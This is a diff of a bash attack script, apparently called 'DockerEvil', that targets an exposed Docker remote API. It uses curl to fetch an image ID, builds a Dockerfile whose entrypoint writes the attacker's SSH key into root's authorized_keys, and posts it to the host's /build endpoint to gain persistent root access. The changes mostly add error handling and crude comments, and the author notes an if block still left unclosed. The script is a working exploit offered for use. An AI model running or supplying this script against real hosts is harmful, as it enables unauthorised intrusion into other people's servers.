@@ -30,28 +30,62 @@ echo "/_______  /\____/ \___  >__|_ \\___  >__|    /_______  / \_/ |__|____/"
 echo "        \/            \/     \/    \/                \/               "
 
 ## Looking for user's parameters along with the command
-if [ $1 == "-h" ] 2> /dev/null
+## Don't forget that this if needs a fi... Delete this comment when you include a fi for this if...
+if [ $1 == "-h" ]
 then
 	echo -e "\n Insert the desired host and port: \n"
 	read HOST
 
-	echo "Getting image ID................\n"
+	echo -e "\nGetting image ID..."
 	curl -s http://$HOST/images/json | json_pp | awk '/sha256:/ {print $3}' | tr -d '"' | tr -d ',' | cut -d ":" -f2,2 > /tmp/IMG_ID.dkr
 	IMG_ID=$(head -n1 /tmp/IMG_ID.dkr)
-	echo "Done\n"
+	rm /tmp/IMG_ID.dkr
+	echo -e "Done\n"
 
-	echo "Getting thy SSH key....................."
+
+## Checking for SSH key file on default location, change here in case you have the SSH key on another path...
+	bool=$(ls ~/.ssh/id_rsa.pub 2> /dev/null; echo $?)
+	if [ $bool -eq 0 ]
+	then
+		echo -e "Default SSH key path detected. Copying it...\n"
+	else
+		echo -e "No SSH key was found or it is not on the default path. Either modify the script or create a SSH key\n The script will end here..."
+		sleep 1
+## Error 2 == no SSH key found on default path. If you're going to change the script to look for the SSH key on another path, you need to coment out the "Checking for SSH key"
+		exit 2
+## Closing SSH key detection if
+	fi
+
+## Cleaning out this variable for later use
+	unset bool
+
+	echo "Getting thy SSH key..."
 	RSA=$(cat ~/.ssh/id_rsa.pub | awk '/ssh-rsa/ {print $2}')
 	echo "Done\n"
 
-	echo "Writing Dockerfile"
+	echo "Writing Dockerfile..."
 	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo '"$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
-	tar -cf dockerevil.tar Dockerfile 2> /dev/null
-	echo "Done"
+	echo "Compressing Dockerfile...."
 
+##	Checking the compression
+		bool=$(tar -cf dockerevil.tar Dockerfile; echo $?)
+		if [ $bool -eq 0 ]
+		then
+			echo -e "Compression done...\n"
+			rm Dockerfile
+		else
+			## If you're having trouble here, try checking if the Dockerfile was indeed created. I didn't direct any error output here, so you can have a chance to see what's wrong if shit happens
+			echo -e "Ooops... Looks like something went wrong while compressing the Dockerfile... I'm gonna go ahead and leave...\n"
+			sleep 1
+			## Error 3 == Something went wrong during the compression of the Dockerfile
+			exit 3
+		## Closing the Check for compression success if statement
+		fi
 
-	echo "Building image with custom entrypoint"
-	curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | grep -o "built ............" > skiddie
+#################### SO FAR, ALL SEEMS GOOD, YOU CHECK FROM HERE ON....... ######################################
+
+	echo "Building image with custom entrypoint..."
+	curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" ##Please change this shit >>> | grep -o "built ............" > skiddie
 
 
 
